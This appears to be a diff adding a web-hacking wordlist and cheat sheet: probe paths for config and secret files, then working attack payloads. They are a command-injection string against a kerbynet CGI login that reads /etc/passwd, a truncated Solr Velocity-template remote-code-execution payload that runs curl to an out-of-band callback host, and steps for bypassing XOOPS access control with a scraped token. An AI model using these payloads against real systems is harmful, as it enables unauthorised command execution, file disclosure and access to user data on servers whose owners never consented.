@@ -1,0 +1,41 @@
+/cgi-bin
+/composer.lock
+composer.json
+package.json
+/WEB-INF/web.xml
+/redirect.jsp
+/index.jsp
+/.version
+/include/findusers.php 
+../mainfile.php
+/phpinfo.php
+/username/charts.json
+/scripts/
+/wp-config.php
+/wp-config.php.bak
+/cookies
+/admin
+/search
+/documents
+/login
+/back-end
+/register
+/keygen
+/software
+/downloads
+/internal
+
+
+/cgi-bin/kerbynet?Action=StartSessionSubmit&PW&User='%0acat%20/etc/passwd%0a'
+/solr/PC-%E4%BA%A4%E6%98%93%E7%AE%A1%E7%90%86-9OiAL4kldG/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20http://en5n2f8z78oas3u2qqqgtyt6mxsugn4c.oastify.com%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf(
+
+
+For 403 bypass:-
+/admin/index.html
+
+
+
+Try to access the /include/findusers.php script without being logged into the application
+You will see an error message saying "Sorry, you don't have permission to access this area."
+Go to /misc.php?action=showpopups&type=friend and look at the HTML source code, search the string XOOPS_TOKEN_REQUEST and copy the value of the token
+Go to /include/findusers.php?token=[TOKEN_VALUE] and you will be able to access the script and e.g. search through the registered users
